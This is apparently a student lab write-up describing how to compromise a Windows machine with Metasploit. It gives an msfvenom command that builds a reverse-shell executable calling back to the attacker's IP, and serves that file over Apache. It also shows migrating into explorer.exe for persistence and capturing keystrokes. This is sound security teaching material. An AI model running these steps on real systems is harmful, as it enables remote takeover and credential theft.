# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
OUTPUT:
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/73df9249-0425-4b20-932d-4837c6ae45c2)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
OUTPUT
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/127368e4-5c79-49a6-b33d-1e7f62f5ed8c)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/29cc407e-6567-4804-82c2-92474dfc0270)
Start apache server sudo systemctl apache2 start
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/eb1001b2-1904-470f-8f82-42fa0414c798)
Check the status of apache2
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/4dcd6005-ffe3-4c68-915a-d8640d85c571)
Invoke msfconsole:

OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/5a15a7d3-8d84-4227-897d-4a65ee7e93ae)
set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/2ba90ceb-8360-46e4-8285-cb5cc8f7adf9)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/a832e813-c1a5-4501-a0ad-9349c121a387)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/04aaf57d-93d3-4865-8ab2-6604dcce934f)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/842d9ca8-2282-4429-8190-1e676bf4c94d)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/4698d960-28c5-4374-9439-03393a5e683e)
keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/1808charitha/Compromising-windows-using-Metasploit/assets/132996838/760536e0-87d5-45db-91fa-0e802a693eb2)















## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
